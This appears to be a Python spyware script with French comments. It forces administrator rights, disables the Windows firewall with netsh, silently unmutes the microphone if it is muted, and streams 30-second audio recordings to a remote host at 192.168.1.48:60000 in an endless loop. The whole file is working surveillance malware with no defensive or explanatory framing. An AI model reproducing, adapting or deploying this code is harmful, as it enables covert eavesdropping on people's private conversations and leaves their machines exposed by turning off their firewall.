import win32api
import win32gui
import sounddevice as sd
import mlsocket
import pyuac
import subprocess

s = mlsocket.MLSocket()
host = '192.168.1.48'
port = 60000


# Execution du prog en Admin
if not pyuac.isUserAdmin():
    pyuac.runAsAdmin()

# Desactiver le Parefeu
subprocess.run('netsh.exe advfirewall set allprofiles state off')


# On teste si le Mic est eteint

fs = 44100  # fréquence d'échantillonnage
sec = 10  # durée de l'enregistrement
record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
sd.wait()

# On teste les vals recup avec les vals du record dans le cas Mute Mic
if record[440998][0] == 3.0517578125e-05 and record[440998][1] == 0.0 and record[440999][0] == 0.0 and record[440999][1] == -3.0517578125e-05:
    print("Unmute Mic Starting .....")
    WM_APPCOMMAND = 0x319
    APPCOMMAND_MICROPHONE_VOLUME_MUTE = 0x180000
    hwnd_active = win32gui.GetForegroundWindow()
    win32api.SendMessage(hwnd_active, WM_APPCOMMAND, None, APPCOMMAND_MICROPHONE_VOLUME_MUTE)

# Si le Mic est en status Unmute en commence l'enregistement directement
print("Mic is On")
print("Recording Starting .....")

# Connection au serveur
i = 0
s.connect((host, port))
s.send(str.encode("Hello server!"))
sec=30
while True:
    print("session", i, "is starting")

    record = sd.rec(int(sec * fs), samplerate=fs, channels=2)
    sd.wait()

    s.send(record)
    print("this session ended")
    i = i+1



